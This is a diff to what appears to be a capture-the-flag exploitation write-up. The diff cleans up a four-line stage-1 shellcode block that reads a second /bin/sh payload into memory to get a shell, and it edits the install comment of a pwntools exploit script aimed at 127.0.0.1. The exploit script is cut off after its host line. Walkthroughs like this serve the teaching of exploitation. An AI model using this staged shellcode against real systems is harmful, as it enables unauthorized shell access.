@@ -29,10 +29,10 @@ The `rax` register is already set to `0` for our `read` syscall, so no modificat
 The final stage 1 shellcode is below:
 
 ```
-mov rsi, rdx' # rdx already contains our buffer location
-mov edx, 0x30' # set our read length
-add rsi, 10' # adjust our buffer a bit further down, so we don't overwrite our initial shellcode
-syscall # Execute read
+mov rsi, rdx  # rdx already contains our buffer location
+mov edx, 0x30 # set our read length
+add rsi, 10   # Move our buffer addr, so we don't overwrite our initial shellcode
+syscall       # Execute read
 ```
 
 From here, we send a second shellcode containing our generic `/bin/sh` shellcode in order to receive our shell.
@@ -40,7 +40,7 @@ From here, we send a second shellcode containing our generic `/bin/sh` shellcode
 The full exploit is below:
 
 ```python
-from pwn import * # pip install pwntools
+from pwn import * # pip install --upgrade git+https://github.com/binjitsu/binjitsu.git
 context(arch='amd64')
 
 HOST = '127.0.0.1'
